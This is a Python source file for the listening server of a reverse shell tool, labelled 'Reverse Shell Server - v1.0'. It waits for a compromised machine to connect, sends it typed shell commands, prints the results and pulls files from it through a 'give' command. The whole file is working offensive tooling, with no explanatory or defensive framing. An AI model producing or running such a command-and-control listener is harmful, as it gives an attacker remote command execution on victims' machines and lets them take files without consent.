import socket
import sys

BUFFER_SIZE = 2048 
SEPARATOR = "<sep>"

def validate_params():
    try:
        params = sys.argv[1:]

        if '--help' in params or '-h' in params:
            print('Reverse Shell Server - v1.0 \nUsage: server.py <host> <port> <options>')
            return
        
        if len(params) < 2:
            print('[-] Error: Inconsistent number of parameters')
            return

        return params[0], int(params[1])
    except ValueError:
        print('[-] Error: Port number must be a integer')

def give(file):
    with open(file, 'wb') as f:
        bytes_read = client_socket.recv(BUFFER_SIZE)
        if not bytes_read:
            return
        f.write(bytes_read)
    print("[+] File transferred successfully.")


if __name__ == '__main__':
    params = validate_params()

    if params:
        host, port = params

        s = socket.socket()
        s.bind((host,port))
        s.listen(5)
        print(f'[+] Listening on {host}:{port} ...')

        client_socket, client_address = s.accept()
        print(f'[+] New shell captured - {client_address}')

        cwd = client_socket.recv(BUFFER_SIZE).decode()

        while True:
            command = input(f'{cwd} $ ')
            command_splited = command.split()

            if not command.strip():
                continue

            client_socket.send(command.encode())

            if command == 'exit':
                break

            if command_splited[0] == 'give':
                give(command_splited[1])
            
            output = client_socket.recv(BUFFER_SIZE).decode()
            results, cwd = output.split(SEPARATOR)

            print(results)

        s.close()
